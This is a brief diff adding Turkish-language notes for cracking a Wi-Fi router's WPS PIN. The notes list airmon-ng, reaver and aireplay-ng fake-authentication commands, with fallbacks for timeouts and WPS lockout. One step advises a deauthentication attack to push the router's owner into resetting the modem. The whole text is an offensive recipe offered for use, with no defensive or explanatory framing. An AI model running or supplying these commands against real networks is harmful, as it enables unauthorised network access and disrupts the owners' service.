@@ -1,0 +1,10 @@
+airmon-ng start <interface>
+reaver --bssid <modem_mac> --channel <channel> -i <interface> (Çalışmazsa sahte yetkilendirme ile modeme kendi macimizi yetkili göstercez.)
+Çalışmazasa: aireplay-ng --fakeauth 100 -a <modem_mac> -h <interface_mac> <interface>
+
+Reaver timeout hatası verirse:
+
+reaver --bssid <modem_mac> --channel <channel> -i <interface> -A -N
+ 
+Saldırı sırasında wps lock etkin olursa:
+Deauth saldırısı yaparak kulanıcıyı modeme reset attırmak zorunda bırakabiliriz.
